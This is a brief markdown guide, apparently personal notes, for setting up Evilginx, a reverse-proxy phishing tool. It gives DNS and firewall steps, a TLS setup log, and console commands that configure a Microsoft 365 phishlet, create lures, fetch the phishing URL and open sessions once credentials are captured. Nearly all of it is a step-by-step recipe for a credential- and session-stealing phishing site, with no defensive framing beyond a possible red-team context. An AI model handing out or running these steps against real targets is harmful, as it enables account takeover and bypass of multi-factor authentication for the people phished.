## Evilginx setup

### Initial config
1.  Set A records in phishing domain settings to proxy the traffic for.
2. Check Evilginx VM firewall settings (e.g. NSG Settings in Azure)
- Inbound 443/TCP & 53/UDP needs to be allowed during setup when setting certificates
```
[19:10:00] [inf] obtaining and setting up 4 TLS certificates - please wait up to 60 seconds...
[19:10:00] [inf] successfully set up all TLS certificates"
```
..after setup, TCP/443 access can be limited to specific source IP-addresses.

3. Create a phishlet to `/usr/share/evilginx/phishlets/` <br>
4. Run Evilginx: `sudo evilginx`

### Evilginx config
`config ipv4 external <EVILGINXVMEXTERNALIP>`<br>
`config unauth_url https://microsoft365.com`

### Phishlets
`phishlets hostname microsoft365 mydomain.local` <br>
`phishlets enable microsoft365`

### Lures
`lures create microsoft365` <br>
`lures edit 0 redirect_url https://microsoft365.com` <br>
`lures get-url 0`

### Sessions (after credentials have been captured)
`sessions <n>`
